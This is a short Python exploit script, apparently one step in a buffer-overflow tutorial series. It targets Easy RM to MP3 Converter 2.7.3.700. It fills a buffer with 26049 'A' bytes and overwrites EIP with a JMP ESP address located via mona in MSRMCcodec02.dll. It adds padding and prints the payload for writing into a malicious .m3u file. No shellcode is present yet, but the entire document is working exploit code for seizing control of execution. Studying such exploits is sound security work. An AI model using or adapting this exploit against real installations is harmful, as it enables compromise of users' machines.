######################################################## 

##      Easy RM to MP3 Converter Buffer Overflow       ## 

##            Ver 2.7.3.700 29 Sept 2006               ##       

##                  Exploit V-05                       ## 

######################################################### 

### Initialize a large variable 'junk' to overflow the buffer with 26049 A's 
junk = '\x41' * 26049 # 26049 26057 

### Initialize a new variable EIP 
### Jmp ESP found at 01aaf23a = \x01\xAA\xF2\x3A -> '\x3A\xF2\xAA\x01' need to change to right to left
### !mona find -s "\xff\xe4" -m MSRMCcodec02.dll to find the above line
eip = '\x3A\xF2\xAA\x01' # '\x42' * 4 

### Initialize a new  variable padding to preserve the size of 
### the exploit buffer 
padding = '\x43' * (30000 - (len(junk) + len(eip))) 

### Build the buffer 
buffer = junk + eip + padding 

### Output the contents of the 'buffer' variable to the terminal 
### Use python [exploit_script].py > [version]-exploit.m3u 
print(buffer)
